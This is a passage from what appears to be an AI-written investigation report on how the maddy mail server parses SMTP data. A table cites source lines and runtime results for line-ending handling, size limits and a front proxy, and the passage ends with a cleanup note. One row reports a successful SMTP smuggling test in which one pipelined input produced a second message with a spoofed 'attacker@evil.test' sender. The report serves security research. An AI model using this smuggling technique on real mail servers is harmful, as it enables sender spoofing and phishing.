| **O2** — identical-except-for-framing | ✅ 4 framings → byte-identical 18-byte body, same SHA-256; dot-unstuffing 32B; `ErrTooLongLine` at 2000; `552 5.3.4` size limit | SHA-256 `5416a9e2…`; `smtp: too longer line in input stream` (lengthlimit_reader.go:8); `MaxLineLength 2000` (server.go:76); `552 5.3.4` (data.go:38-41) |
| **O3** — pipelined smuggling | ✅ one blast → 5 responses, 2 messages, spoofed `attacker@evil.test` (`faeb2971`) on one `src_ip` | `c.text.DotReader()` (data.go:53); stateDot+`\n`→stateEOF (reader.go:351) |
| **O4** — back-to-back stability | ✅ 4 ordered msg_ids, 4 correct bodies, ~41 ms client-timing spread; bare-CR hang → `i/o timeout`/`451` at read_timeout | `BufferInMemory` (memory.go:27, smtp.go:298); `read_timeout` 10 min default (smtp.go:560); `451 4.0.0` + `221 2.4.2 Idle timeout, bye bye` |
| **O5** — front proxy | ✅ DIRECT=2, CLEAN=2, BLOCK=0; `521 5.5.2 bare newline rejected` + `554 5.0.0` | no native proxy support (repo grep `proxy_protocol`/`proxyproto` = 0) |
| **O6** — negative space | ✅ 0 files linger after failure; 0 bare-LF rejections in any log; lflf markers ≡ crlf markers | `DATA error` (smtp.go:317); `aborted` (smtp.go:72); `io.Copy(ioutil.Discard, r)` (conn.go:521) |

**Items grounded in source rather than a direct runtime probe (labeled):** the internal `net/textproto` state transitions (`reader.go:311-379`) are cited from source; their *effects* (bare-LF acceptance, bare-CR non-termination, dot-unstuffing, `\r\n`→`\n`) are all confirmed by the observed delivered bytes above. The 32 MiB size limit and the over-length-line limit **were** exercised at runtime (`552 5.3.4` and `ErrTooLongLine` captured).

---

## Cleanup note

All observation artifacts lived outside the repository under `/tmp/maddy_investigation/` (the built `maddy_bin`, the minimal configs, the `scripts/` probes and proxy, the `queue_dbg`/`state`/`runtime` directories, and the captured logs — including a 35 MB `wire_size.log` from the size-limit stream). These were deleted after evidence capture. The only change introduced to the repository is this document; `git status --porcelain` shows solely `blitzy/documentation/maddy_26452dd8dd78.md`, and `go.mod`/`go.sum` are unchanged.
